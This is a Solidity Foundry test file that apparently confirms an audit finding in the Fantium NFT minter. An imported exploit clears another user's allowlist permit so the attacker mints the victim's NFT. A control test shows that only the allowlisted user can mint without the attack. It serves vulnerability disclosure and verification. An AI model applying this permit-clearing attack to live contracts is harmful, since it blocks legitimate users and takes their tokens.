// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import "forge-std/Test.sol";
import "forge-std/console2.sol";
import {Exploit, FantiumNFT, FantiumMinterV1, Victim} from
    "./28051-an-intruder-can-block-any-users-mixbytes-none-fantium-markdo.sol";

contract Finding28051Test is Test {
    function test_intruder_clears_another_users_permit() public {
        Exploit e = new Exploit();
        vm.deal(address(this), 200000000000000);
        e.run{value: 100000000000000}();
        vm.deal(address(e.victim()), 100000000000000);
        bool minted = e.victim().tryMint{value: 100000000000000}(e.minter());
        assertFalse(minted, "victim blocked");
        assertEq(e.victimPermit(), 0, "permit");
        assertEq(e.nft().balanceOf(address(e)), 1, "attacker nft");
        assertEq(e.nft().balanceOf(address(e.victim())), 0, "victim nft");
        console2.log("victim permit", e.victimPermit());
        console2.log("attacker nfts", e.nft().balanceOf(address(e)));
    }

    function test_control_only_the_allowlisted_user_can_mint() public {
        FantiumNFT nft = new FantiumNFT();
        FantiumMinterV1 minter = new FantiumMinterV1(nft);
        Victim victim = new Victim();
        minter.setAllow(1, address(victim), true);

        address intruder = address(0xA11CE);
        vm.deal(intruder, 100000000000000);
        vm.prank(intruder);
        vm.expectRevert(bytes("to"));
        minter.mintFixed{value: 100000000000000}(address(victim), 1);

        vm.deal(address(victim), 100000000000000);
        vm.prank(address(victim));
        minter.mintFixed{value: 100000000000000}(address(victim), 1);
        assertEq(nft.ownerOf(1000001), address(victim), "victim owns it");
        assertEq(nft.balanceOf(intruder), 0, "intruder has 0");
        console2.log("control victim balance", nft.balanceOf(address(victim)));
    }
}
